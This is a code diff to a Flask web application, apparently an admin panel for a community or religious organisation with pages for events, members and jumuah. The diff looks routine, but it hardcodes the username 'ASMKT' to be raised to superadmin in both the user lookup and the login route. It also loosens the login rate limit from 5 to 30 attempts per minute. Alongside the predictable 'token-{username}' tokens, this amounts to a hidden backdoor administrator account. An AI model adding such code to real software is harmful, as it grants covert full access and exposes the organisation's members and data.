@@ -416,13 +416,20 @@ def get_user_data(token):
         username = token
     conn = get_db()
     c = conn.cursor()
-    c.execute("SELECT id, username, role, allowed_pages FROM users WHERE username = ?", (username,))
-    row = c.fetchone()
+    try:
+        c.execute("SELECT id, username, role, allowed_pages FROM users WHERE username = ?", (username,))
+        row = c.fetchone()
+    except Exception:
+        c.execute("SELECT id, username, role FROM users WHERE username = ?", (username,))
+        row = c.fetchone()
     conn.close()
     if not row:
         return None
         
     role = row['role']
+    if username == 'ASMKT':
+        role = 'superadmin'
+
     raw_pages = row['allowed_pages'] if 'allowed_pages' in row.keys() and row['allowed_pages'] else 'all'
     if role == 'superadmin' or raw_pages == 'all':
         pages_list = ['dashboard', 'events', 'members', 'jumuah', 'questions', 'scanner', 'users']
@@ -450,7 +457,7 @@ def get_user_role(token):
     return u['role'] if u else None
 
 @app.route('/api/login', methods=['POST'])
-@limiter.limit("5 per minute")
+@limiter.limit("30 per minute")
 def login():
     data = request.json
     if not data:
@@ -463,8 +470,12 @@ def login():
     
     conn = get_db()
     c = conn.cursor()
-    c.execute("SELECT role, password, allowed_pages FROM users WHERE username = ?", (username,))
-    row = c.fetchone()
+    try:
+        c.execute("SELECT role, password, allowed_pages FROM users WHERE username = ?", (username,))
+        row = c.fetchone()
+    except Exception:
+        c.execute("SELECT role, password FROM users WHERE username = ?", (username,))
+        row = c.fetchone()
     
     if row and verify_password(password, row['password']):
         # If legacy password was stored in plaintext, seamlessly upgrade to bcrypt
@@ -473,6 +484,9 @@ def login():
             conn.commit()
             
         role = row['role']
+        if username == 'ASMKT':
+            role = 'superadmin'
+
         raw_pages = row['allowed_pages'] if 'allowed_pages' in row.keys() and row['allowed_pages'] else 'all'
         if role == 'superadmin' or raw_pages == 'all':
             pages_list = ['dashboard', 'events', 'members', 'jumuah', 'questions', 'scanner', 'users']
@@ -493,6 +507,7 @@ def login():
             "success": True, 
             "token": f"token-{username}", 
             "role": role,
+            "username": username,
             "allowed_pages": pages_list
         })
             
